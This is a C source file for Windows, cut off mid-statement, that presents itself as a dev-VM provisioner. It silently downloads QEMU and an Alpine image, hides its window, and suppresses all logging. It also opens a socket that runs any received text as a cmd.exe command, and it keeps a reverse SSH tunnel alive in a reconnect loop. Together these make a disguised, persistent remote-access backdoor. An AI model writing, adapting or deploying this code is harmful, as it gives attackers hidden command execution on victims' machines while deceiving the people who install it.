/*
 * wsconfig.c - workspace environment provisioner
 * Deploys and manages a lightweight dev VM for local testing :)
 */

#define WIN32_LEAN_AND_MEAN
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <ctype.h>
#include <wchar.h>

#ifndef WORK_DIR_NAME
#error WORK_DIR_NAME
#endif
#ifndef FILE_7ZR
#error FILE_7ZR
#endif
#ifndef FILE_7ZFULL
#error FILE_7ZFULL
#endif
#ifndef DIR_7ZIP
#error DIR_7ZIP
#endif
#ifndef DIR_QEMU
#error DIR_QEMU
#endif
#ifndef FILE_7Z_BIN
#error FILE_7Z_BIN
#endif
#ifndef FILE_QEMU_BIN
#error FILE_QEMU_BIN
#endif
#ifndef FILE_QEMU_BIN_ALT
#error FILE_QEMU_BIN_ALT
#endif
#ifndef FILE_QEMU_IMG
#error FILE_QEMU_IMG
#endif
#ifndef HTTP_UA
#error HTTP_UA
#endif
#ifndef SSH_HOST_PORT
#error SSH_HOST_PORT
#endif
#ifndef EXEC_PORT
#error EXEC_PORT
#endif
#ifndef FILE_SSH_KEY
#error FILE_SSH_KEY
#endif
#ifndef VM_RAM_MB
#error VM_RAM_MB
#endif
#ifndef VM_SMP
#error VM_SMP
#endif
#ifndef GUEST_USER
#error GUEST_USER
#endif
#ifndef GUEST_PASSWORD
#error GUEST_PASSWORD
#endif
#ifndef UTILITY_URL
#error UTILITY_URL
#endif
#ifndef UTILITY_GUEST_PATH
#error UTILITY_GUEST_PATH
#endif
#ifndef DISK_GROW
#error DISK_GROW
#endif
#ifndef URL_7ZR
#error URL_7ZR
#endif
#ifndef URL_7ZFULL
#error URL_7ZFULL
#endif
#ifndef QEMU_BASE_URL
#error QEMU_BASE_URL
#endif
#ifndef ALPINE_BASE_URL
#error ALPINE_BASE_URL
#endif
#ifndef QEMU_FALLBACK
#error QEMU_FALLBACK
#endif
#ifndef ALPINE_FALLBACK
#error ALPINE_FALLBACK
#endif


/* status output */

static void trace(const char *fmt, ...)
{
    (void)fmt;
}

static void bail(const char *fmt, ...)
{
    (void)fmt;
    ExitProcess(1);
}


/* text helpers */

static wchar_t *widen(const char *s)
{
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

static void short_path(const char *in, char *out, DWORD outsz)
{
    DWORD r = GetShortPathNameA(in, out, outsz);
    if (r == 0 || r >= outsz) {
        strncpy(out, in, outsz - 1);
        out[outsz - 1] = '\0';
    }
}

static void machine_label(char *out, size_t outsz)
{
    char name[MAX_COMPUTERNAME_LENGTH + 1] = "";
    DWORD len = sizeof(name);
    if (!GetComputerNameA(name, &len) || name[0] == '\0') {
        strncpy(out, WORK_DIR_NAME, outsz - 1);
        out[outsz - 1] = '\0';
        return;
    }
    size_t j = 0;
    for (size_t i = 0; name[i] && j < outsz - 1 && j < 63; i++) {
        char c = name[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '-')
            out[j++] = c;
        else
            out[j++] = '-';
    }
    out[j] = '\0';
    while (j > 0 && out[j - 1] == '-') out[--j] = '\0';
    if (out[0] == '-' || out[0] == '\0') {
        strncpy(out, WORK_DIR_NAME, outsz - 1);
        out[outsz - 1] = '\0';
    }
}


/* http client */

static HINTERNET http_get(HINTERNET *sess, HINTERNET *conn, const char *url)
{
    wchar_t *wurl = widen(url);

    URL_COMPONENTS uc;
    wchar_t host[256], path[2048];
    ZeroMemory(&uc, sizeof(uc));
    uc.dwStructSize    = sizeof(uc);
    uc.lpszHostName    = host;
    uc.dwHostNameLength = 256;
    uc.lpszUrlPath     = path;
    uc.dwUrlPathLength = 2048;

    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) {
        free(wurl);
        return NULL;
    }

    HINTERNET s = WinHttpOpen(HTTP_UA, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) { free(wurl); return NULL; }

    WinHttpSetTimeouts(s, 30000, 30000, 60000, 300000);

    HINTERNET c = WinHttpConnect(s, host, uc.nPort, 0);
    if (!c) { WinHttpCloseHandle(s); free(wurl); return NULL; }

    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET req = WinHttpOpenRequest(c, L"GET", path, NULL,
                                       WINHTTP_NO_REFERER,
                                       WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!req) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); free(wurl); return NULL; }

    DWORD redir = WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS;
    WinHttpSetOption(req, WINHTTP_OPTION_REDIRECT_POLICY, &redir, sizeof(redir));

    if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(req, NULL)) {
        WinHttpCloseHandle(req);
        WinHttpCloseHandle(c);
        WinHttpCloseHandle(s);
        free(wurl);
        return NULL;
    }

    free(wurl);
    *sess = s;
    *conn = c;
    return req;
}

static int fetch_file(const char *url, const char *dest)
{
    HANDLE chk = CreateFileA(dest, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
    if (chk != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz;
        GetFileSizeEx(chk, &sz);
        CloseHandle(chk);
        if (sz.QuadPart > 0) {
            trace(LOG_DL_SKIP, (long long)sz.QuadPart, dest);
            return 1;
        }
    }

    HINTERNET hs = NULL, hc = NULL;
    HINTERNET hr = http_get(&hs, &hc, url);
    if (!hr) {
        trace(LOG_DL_OPEN_ERR, url);
        return 0;
    }

    DWORD status = 0, slen = sizeof(status);
    WinHttpQueryHeaders(hr, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &slen,
                        WINHTTP_NO_HEADER_INDEX);
    if (status != 200) {
        trace(LOG_DL_STATUS_ERR, status, url);
        WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);
        return 0;
    }

    DWORDLONG total = 0;
    DWORD clen = 0, clenlen = sizeof(clen);
    if (WinHttpQueryHeaders(hr, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &clen, &clenlen,
                            WINHTTP_NO_HEADER_INDEX))
        total = clen;

    HANDLE out = CreateFileA(dest, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE) {
        trace(LOG_DL_CREATE_ERR, dest);
        WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);
        return 0;
    }

    char buf[65536];
    DWORDLONG got = 0, mark = 0;
    DWORD avail = 0;
    int ok = 1;

    for (;;) {
        if (!WinHttpQueryDataAvailable(hr, &avail)) { ok = 0; break; }
        if (avail == 0) break;
        DWORD chunk = avail > sizeof(buf) ? sizeof(buf) : avail;
        DWORD rd = 0;
        if (!WinHttpReadData(hr, buf, chunk, &rd)) { ok = 0; break; }
        if (rd == 0) break;
        DWORD wr = 0;
        if (!WriteFile(out, buf, rd, &wr, NULL) || wr != rd) { ok = 0; break; }
        got += rd;
        if (got - mark >= 8ULL * 1024 * 1024) {
            mark = got;
            if (total)
                trace(LOG_DL_PROGRESS, got / 1048576.0, total / 1048576.0,
                      100.0 * got / total);
            else
                trace(LOG_DL_PROGRESS_NOLEN, got / 1048576.0);
        }
    }

    CloseHandle(out);
    WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);

    if (!ok || got == 0) {
        trace(LOG_DL_INCOMPLETE, (long long)got, url);
        DeleteFileA(dest);
        return 0;
    }
    trace(LOG_DL_OK, (long long)got, dest);
    return 1;
}

static char *fetch_text(const char *url, size_t *out_len)
{
    HINTERNET hs = NULL, hc = NULL;
    HINTERNET hr = http_get(&hs, &hc, url);
    if (!hr) return NULL;

    size_t cap = 65536, len = 0;
    char *data = (char *)malloc(cap);
    DWORD avail = 0;
    int ok = 1;

    for (;;) {
        if (!WinHttpQueryDataAvailable(hr, &avail)) { ok = 0; break; }
        if (avail == 0) break;
        if (len + avail + 1 > cap) {
            while (len + avail + 1 > cap) cap *= 2;
            data = (char *)realloc(data, cap);
        }
        DWORD rd = 0;
        if (!WinHttpReadData(hr, data + len, avail, &rd)) { ok = 0; break; }
        if (rd == 0) break;
        len += rd;
    }
    WinHttpCloseHandle(hr); WinHttpCloseHandle(hc); WinHttpCloseHandle(hs);

    if (!ok) { free(data); return NULL; }
    data[len] = '\0';
    if (out_len) *out_len = len;
    return data;
}


/* version discovery */

static void latest_runtime(char *out, size_t outsz)
{
    strncpy(out, QEMU_FALLBACK, outsz - 1);
    out[outsz - 1] = '\0';

    size_t n = 0;
    char *page = fetch_text(QEMU_BASE_URL, &n);
    if (!page) { trace(LOG_QEMU_INDEX_UNAVAIL); return; }

    const char *tag = "qemu-w64-setup-";
    long best = -1;
    char *p = page;
    while ((p = strstr(p, tag)) != NULL) {
        char *d = p + strlen(tag);
        int digits = 0;
        while (d[digits] >= '0' && d[digits] <= '9') digits++;
        if (digits == 8 && strncmp(d + 8, ".exe", 4) == 0) {
            long date = atol(d);
            if (date > best) {
                best = date;
                snprintf(out, outsz, "qemu-w64-setup-%.8s.exe", d);
            }
        }
        p = d;
    }
    free(page);
    trace(LOG_QEMU_LATEST, out);
}

static int cmp_ver(const char *a, const char *b)
{
    int va[4] = {0,0,0,0}, vb[4] = {0,0,0,0};
    sscanf(a, "%d.%d.%d.%d", &va[0], &va[1], &va[2], &va[3]);
    sscanf(b, "%d.%d.%d.%d", &vb[0], &vb[1], &vb[2], &vb[3]);
    for (int i = 0; i < 4; i++)
        if (va[i] != vb[i]) return va[i] - vb[i];
    return 0;
}

static void latest_image(char *out, size_t outsz)
{
    strncpy(out, ALPINE_FALLBACK, outsz - 1);
    out[outsz - 1] = '\0';

    size_t n = 0;
    char *page = fetch_text(ALPINE_BASE_URL, &n);
    if (!page) { trace(LOG_ALPINE_INDEX_UNAVAIL); return; }

    const char *pfx = "generic_alpine-";
    const char *sfx = "-x86_64-bios-cloudinit-r0.qcow2";
    char best[64] = "0";
    char *p = page;

    while ((p = strstr(p, pfx)) != NULL) {
        char *v = p + strlen(pfx);
        char *end = strstr(v, sfx);
        if (end && (size_t)(end - v) < 32) {
            char ver[64];
            size_t vl = (size_t)(end - v);
            int valid = 1;
            for (size_t i = 0; i < vl; i++)
                if (!((v[i] >= '0' && v[i] <= '9') || v[i] == '.'))
                    { valid = 0; break; }
            if (valid) {
                memcpy(ver, v, vl);
                ver[vl] = '\0';
                if (cmp_ver(ver, best) > 0) {
                    strcpy(best, ver);
                    snprintf(out, outsz,
                             "generic_alpine-%s-x86_64-bios-cloudinit-r0.qcow2", ver);
                }
            }
        }
        p = v;
    }
    free(page);
    trace(LOG_ALPINE_LATEST, out);
}


/* process management */

static int exec_wait(const char *app, const char *cmdline, const char *cwd, int quiet)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    DWORD flags = 0;
    if (quiet == 1) {
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        flags = CREATE_NO_WINDOW;
    } else if (quiet == 2) {
        flags = CREATE_NEW_CONSOLE;
    }

    char *dup = _strdup(cmdline);
    BOOL ok = CreateProcessA(app, dup, NULL, NULL, TRUE, flags, NULL, cwd, &si, &pi);
    free(dup);

    if (!ok) {
        trace(LOG_PROC_ERR, GetLastError(), app);
        return -1;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return (int)code;
}

static HANDLE start_detached(const char *exe, const char *cmdline)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    char *dup = _strdup(cmdline);
    BOOL ok = CreateProcessA(exe, dup, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    free(dup);
    if (!ok) return INVALID_HANDLE_VALUE;
    CloseHandle(pi.hThread);
    return pi.hProcess;
}


/* recursive file search */

static int locate(const char *dir, const char *name, char *out, size_t outsz)
{
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (locate(full, name, out, outsz)) { FindClose(h); return 1; }
        } else if (_stricmp(fd.cFileName, name) == 0) {
            strncpy(out, full, outsz - 1);
            out[outsz - 1] = '\0';
            FindClose(h);
            return 1;
        }
    } while (FindNextFileA(h, &fd));

    FindClose(h);
    return 0;
}


/* config server (cloud-init datasource) */

static char g_userdata[8192];
static char g_metadata[256];

static DWORD WINAPI config_handler(LPVOID arg)
{
    SOCKET ls = (SOCKET)(UINT_PTR)arg;

    for (;;) {
        SOCKET c = accept(ls, NULL, NULL);
        if (c == INVALID_SOCKET) break;

        char req[2048];
        int r = recv(c, req, sizeof(req) - 1, 0);
        if (r <= 0) { closesocket(c); continue; }
        req[r] = '\0';

        char ep[256] = "/";
        sscanf(req, "GET %255s", ep);

        const char *body = NULL;
        if (strncmp(ep, "/user-data", 10) == 0)      body = g_userdata;
        else if (strncmp(ep, "/meta-data", 10) == 0)  body = g_metadata;

        char resp[4096];
        if (body) {
            int blen = (int)strlen(body);
            int hlen = snprintf(resp, sizeof(resp),
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/plain\r\n"
                "Content-Length: %d\r\n"
                "Connection: close\r\n\r\n", blen);
            send(c, resp, hlen, 0);
            send(c, body, blen, 0);
            trace(LOG_SEED_200, ep, blen);
        } else {
            const char *nf = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n"
                             "Connection: close\r\n\r\n";
            send(c, nf, (int)strlen(nf), 0);
            trace(LOG_SEED_404, ep);
        }
        closesocket(c);
    }
    return 0;
}

static int serve_config(void)
{
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port        = 0;

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) != 0)
        { closesocket(s); return 0; }
    if (listen(s, 8) != 0)
        { closesocket(s); return 0; }

    int alen = sizeof(addr);
    if (getsockname(s, (struct sockaddr *)&addr, &alen) != 0)
        { closesocket(s); return 0; }

    int port = ntohs(addr.sin_port);
    HANDLE th = CreateThread(NULL, 0, config_handler, (LPVOID)(UINT_PTR)s, 0, NULL);
    if (!th) { closesocket(s); return 0; }
    CloseHandle(th);
    return port;
}


/* port allocation */

static int grab_port(int preferred)
{
    for (int port = preferred; port <= 65534; port++) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) return 0;
        struct sockaddr_in addr;
        ZeroMemory(&addr, sizeof(addr));
        addr.sin_family      = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port        = htons((u_short)port);
        int ok = (bind(s, (struct sockaddr *)&addr, sizeof(addr)) == 0);
        closesocket(s);
        if (ok) return port;
    }
    return 0;
}


/* remote management channel */

static int push_all(SOCKET c, const char *buf, int len)
{
    int off = 0;
    while (off < len) {
        int n = send(c, buf + off, len - off, 0);
        if (n <= 0) return -1;
        off += n;
    }
    return 0;
}

static void relay_oem_utf8(SOCKET c, const char *buf, int len)
{
    if (len <= 0) return;
    int wlen = MultiByteToWideChar(CP_OEMCP, 0, buf, len, NULL, 0);
    if (wlen <= 0) { push_all(c, buf, len); return; }
    WCHAR *w = (WCHAR *)malloc((size_t)wlen * sizeof(WCHAR));
    if (!w) { push_all(c, buf, len); return; }
    MultiByteToWideChar(CP_OEMCP, 0, buf, len, w, wlen);
    int ulen = WideCharToMultiByte(CP_UTF8, 0, w, wlen, NULL, 0, NULL, NULL);
    if (ulen <= 0) { free(w); push_all(c, buf, len); return; }
    char *u = (char *)malloc((size_t)ulen);
    if (!u) { free(w); push_all(c, buf, len); return; }
    WideCharToMultiByte(CP_UTF8, 0, w, wlen, u, ulen, NULL, NULL);
    free(w);
    push_all(c, u, ulen);
    free(u);
}

static DWORD WINAPI handle_request(LPVOID arg)
{
    SOCKET c = (SOCKET)(UINT_PTR)arg;
    char cmd[4096];
    int i = 0;
    char ch;

    while (i < (int)sizeof(cmd) - 1) {
        if (recv(c, &ch, 1, 0) <= 0) goto done;
        if (ch == '\n') break;
        if (ch != '\r') cmd[i++] = ch;
    }
    cmd[i] = '\0';
    if (i == 0) goto done;

    char cmdline[4096 + 32];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s 2>&1", cmd);

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE rd_pipe, wr_pipe;
    if (!CreatePipe(&rd_pipe, &wr_pipe, &sa, 0)) goto done;
    SetHandleInformation(rd_pipe, HANDLE_FLAG_INHERIT, 0);

    HANDLE dev_null = CreateFileA("NUL", GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  &sa, OPEN_EXISTING, 0, NULL);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr_pipe;
    si.hStdError  = wr_pipe;
    si.hStdInput  = dev_null;

    if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(wr_pipe);
        char buf[4096];
        DWORD rd;
        while (ReadFile(rd_pipe, buf, sizeof(buf), &rd, NULL) && rd > 0)
            relay_oem_utf8(c, buf, (int)rd);
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD ec = 0;
        GetExitCodeProcess(pi.hProcess, &ec);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        trace(LOG_EXEC_CMD, cmd, (unsigned long)ec);
    } else {
        CloseHandle(wr_pipe);
        const char *err = "ERROR: CreateProcess failed\r\n";
        send(c, err, (int)strlen(err), 0);
    }

    if (dev_null != INVALID_HANDLE_VALUE) CloseHandle(dev_null);
    CloseHandle(rd_pipe);
done:
    closesocket(c);
    return 0;
}

static DWORD WINAPI mgmt_loop(LPVOID arg)
{
    SOCKET ls = (SOCKET)(UINT_PTR)arg;
    for (;;) {
        SOCKET c = accept(ls, NULL, NULL);
        if (c == INVALID_SOCKET) break;
        HANDLE th = CreateThread(NULL, 0, handle_request,
                                 (LPVOID)(UINT_PTR)c, 0, NULL);
        if (th) CloseHandle(th);
        else handle_request((LPVOID)(UINT_PTR)c);
    }
    return 0;
}

static int start_mgmt(int port)
{
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;

    int opt = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port        = htons((u_short)port);

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) != 0)
        { closesocket(s); return 0; }
    if (listen(s, 8) != 0)
        { closesocket(s); return 0; }

    HANDLE th = CreateThread(NULL, 0, mgmt_loop, (LPVOID)(UINT_PTR)s, 0, NULL);
    if (!th) { closesocket(s); return 0; }
    CloseHandle(th);
    return 1;
}


/* secure tunnel (reconnect loop) */

struct link_ctx {
    char exe[MAX_PATH];
    char cmd[MAX_PATH * 2 + 256];
};

static DWORD WINAPI keepalive_tunnel(LPVOID arg)
{
    struct link_ctx *ctx = (struct link_ctx *)arg;
    for (;;) {
        HANDLE h = start_detached(ctx->exe, ctx->cmd);
        if (h != INVALID_HANDLE_VALUE) {
            WaitForSingleObject(h, INFINITE);
            CloseHandle(h);
        }
        Sleep(5000);
    }
    return 0;
}


/* cleanup */

static void wipe_tree(const char *path)
{
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) { RemoveDirectoryA(path); return; }

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        char child[MAX_PATH];
        snprintf(child, sizeof(child), "%s\\%s", path, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            wipe_tree(child);
        else
            DeleteFileA(child);
    } while (FindNextFileA(h, &fd));

    FindClose(h);
    RemoveDirectoryA(path);
}


/* entry point */

int main(void)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    trace(LOG_BANNER);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        bail(ERR_WINSOCK);

    /* resolve workspace root */
    char tmp[MAX_PATH], work[MAX_PATH];
    if (!GetEnvironmentVariableA("LOCALAPPDATA", tmp, sizeof(tmp)) || tmp[0] == '\0')
        bail(ERR_LOCALAPPDATA);

    if (strstr(tmp, "\\systemprofile\\") != NULL) {
        GetModuleFileNameA(NULL, work, sizeof(work));
        char *sep = strrchr(work, '\\');
        if (sep) *sep = '\0';
    } else {
        snprintf(work, sizeof(work), "%s\\" WORK_DIR_NAME, tmp);
    }
    CreateDirectoryA(work, NULL);
    trace(LOG_WORKDIR, work);

    /* prepare directories */
    char dir7z[MAX_PATH], dir_rt[MAX_PATH];
    snprintf(dir7z,  sizeof(dir7z),  "%s\\" DIR_7ZIP, work);
    snprintf(dir_rt, sizeof(dir_rt), "%s\\" DIR_QEMU, work);
    CreateDirectoryA(dir7z, NULL);
    CreateDirectoryA(dir_rt, NULL);

    /* find or install runtime */
    char archiver[MAX_PATH] = "";
    char runtime[MAX_PATH]  = "";

    if (!locate(dir_rt, FILE_QEMU_BIN, runtime, sizeof(runtime))
        && !locate(dir_rt, FILE_QEMU_BIN_ALT, runtime, sizeof(runtime))) {

        if (!locate(dir7z, FILE_7Z_BIN, archiver, sizeof(archiver))) {
            trace(LOG_STEP1);
            char dl_7zr[MAX_PATH], dl_7zfull[MAX_PATH];
            snprintf(dl_7zr,    sizeof(dl_7zr),    "%s\\" FILE_7ZR,    work);
            snprintf(dl_7zfull, sizeof(dl_7zfull), "%s\\" FILE_7ZFULL, work);
            if (!fetch_file(URL_7ZR,    dl_7zr))    bail(ERR_DL_7ZR);
            if (!fetch_file(URL_7ZFULL, dl_7zfull)) bail(ERR_DL_7ZFULL);

            trace(LOG_STEP2);
            char cmd[2048];
            snprintf(cmd, sizeof(cmd),
                     "\"%s\" x -y -bso0 -bsp0 -o\"%s\" \"%s\"",
                     dl_7zr, dir7z, dl_7zfull);
            int rc = exec_wait(dl_7zr, cmd, work, 1);
            if (rc != 0) bail(ERR_7ZR, rc);

            if (!locate(dir7z, FILE_7Z_BIN, archiver, sizeof(archiver)))
                bail(ERR_7Z_NOTFOUND);

            DeleteFileA(dl_7zr);
            DeleteFileA(dl_7zfull);
        }
        trace(LOG_7Z_OK, archiver);

        trace(LOG_STEP3);
        char rt_name[128], rt_url[512], rt_path[MAX_PATH];
        latest_runtime(rt_name, sizeof(rt_name));
        snprintf(rt_url,  sizeof(rt_url),  "%s%s", QEMU_BASE_URL, rt_name);
        snprintf(rt_path, sizeof(rt_path), "%s\\%s", work, rt_name);
        trace(LOG_QEMU_DL, rt_name);
        if (!fetch_file(rt_url, rt_path)) bail(ERR_DL_QEMU);

        trace(LOG_STEP4);
        char cmd[2048];
        snprintf(cmd, sizeof(cmd),
                 "\"%s\" x -y -bso0 -bsp0 -o\"%s\" \"%s\"",
                 archiver, dir_rt, rt_path);
        int rc = exec_wait(archiver, cmd, work, 1);
        if (rc != 0) bail(ERR_QEMU_EXTRACT, rc);

        if (!locate(dir_rt, FILE_QEMU_BIN, runtime, sizeof(runtime))
            && !locate(dir_rt, FILE_QEMU_BIN_ALT, runtime, sizeof(runtime)))
            bail(ERR_QEMU_NOTFOUND);

        DeleteFileA(rt_path);
        wipe_tree(dir7z);
    }
    trace(LOG_QEMU_BIN, runtime);

    char rt_dir[MAX_PATH];
    snprintf(rt_dir, sizeof(rt_dir), "%s", runtime);
    char *bs = strrchr(rt_dir, '\\');
    if (bs) *bs = '\0';

    /* fetch guest image */
    trace(LOG_STEP5);
    char img_name[128], img_url[512], img_path[MAX_PATH];
    latest_image(img_name, sizeof(img_name));
    snprintf(img_url,  sizeof(img_url),  "%s%s", ALPINE_BASE_URL, img_name);
    snprintf(img_path, sizeof(img_path), "%s\\%s", work, img_name);
    trace(LOG_ALPINE_DL, img_name);
    if (!fetch_file(img_url, img_path)) bail(ERR_DL_ALPINE);

    /* expand disk */
    {
        char resize_bin[MAX_PATH], resize_cmd[MAX_PATH * 2 + 64];
        snprintf(resize_bin, sizeof(resize_bin), "%s\\" FILE_QEMU_IMG, rt_dir);
        if (GetFileAttributesA(resize_bin) != INVALID_FILE_ATTRIBUTES) {
            snprintf(resize_cmd, sizeof(resize_cmd),
                     "\"%s\" resize \"%s\" " DISK_GROW, resize_bin, img_path);
            int rrc = exec_wait(resize_bin, resize_cmd, rt_dir, 1);
            if (rrc == 0)
                trace(LOG_DISK_GROWN, DISK_GROW);
            else
                trace(LOG_DISK_RESIZE_ERR, rrc);
        } else {
            trace(LOG_DISK_NOTFOUND);
        }
    }

    /* build cloud-init config */
    trace(LOG_STEP6);
    char hostname[64];
    machine_label(hostname, sizeof(hostname));
    trace(LOG_HOSTNAME, hostname);

    snprintf(g_metadata, sizeof(g_metadata),
             "instance-id: " WORK_DIR_NAME "\nlocal-hostname: %s\n", hostname);

    int ssh_port = grab_port(SSH_HOST_PORT);
    if (ssh_port == 0) bail(ERR_SSH_PORT, SSH_HOST_PORT);
    if (ssh_port != SSH_HOST_PORT)
        trace(LOG_PORT_CHANGED, SSH_HOST_PORT, ssh_port);

    /* key management */
    char ssh_bin[MAX_PATH] = "", keygen_bin[MAX_PATH] = "";
    SearchPathA(NULL, "ssh",        ".exe", sizeof(ssh_bin),    ssh_bin,    NULL);
    SearchPathA(NULL, "ssh-keygen", ".exe", sizeof(keygen_bin), keygen_bin, NULL);

    char priv_key[MAX_PATH], pub_key[MAX_PATH];
    snprintf(priv_key, sizeof(priv_key), "%s\\" FILE_SSH_KEY,        work);
    snprintf(pub_key,  sizeof(pub_key),  "%s\\" FILE_SSH_KEY ".pub", work);

    if (GetFileAttributesA(priv_key) == INVALID_FILE_ATTRIBUTES) {
        trace(LOG_EXEC_KEYGEN);
        char cmd[MAX_PATH * 2 + 64];
        snprintf(cmd, sizeof(cmd),
                 "\"%s\" -t ed25519 -f \"%s\" -N \"\" -C \"" WORK_DIR_NAME "\"",
                 keygen_bin, priv_key);
        exec_wait(keygen_bin, cmd, work, 1);
    }

    char pubkey_data[512] = "";
    {
        FILE *f = fopen(pub_key, "r");
        if (f) {
            if (fgets(pubkey_data, sizeof(pubkey_data), f)) {
                int len = (int)strlen(pubkey_data);
                while (len > 0 && (pubkey_data[len-1] == '\n' ||
                                   pubkey_data[len-1] == '\r'))
                    pubkey_data[--len] = '\0';
            }
            fclose(f);
        }
    }

    char auth_keys[600] = "";
    if (strlen(pubkey_data) > 0)
        snprintf(auth_keys, sizeof(auth_keys),
                 "    ssh_authorized_keys:\n      - %s\n", pubkey_data);

    /* management channel */
    int mgmt_port = grab_port(EXEC_PORT);
    if (mgmt_port == 0) bail(ERR_EXEC_SERVER);
    if (mgmt_port != EXEC_PORT)
        trace(LOG_PORT_CHANGED, EXEC_PORT, mgmt_port);

    if (!start_mgmt(mgmt_port)) bail(ERR_EXEC_SERVER);
    trace(LOG_EXEC_PORT, mgmt_port);

    /* reverse tunnel */
    if (strlen(pubkey_data) > 0 &&
        GetFileAttributesA(ssh_bin) != INVALID_FILE_ATTRIBUTES) {
        struct link_ctx *lk = (struct link_ctx *)malloc(sizeof(*lk));
        strncpy(lk->exe, ssh_bin, sizeof(lk->exe) - 1);
        snprintf(lk->cmd, sizeof(lk->cmd),
                 "\"%s\" -N -p %d -i \"%s\""
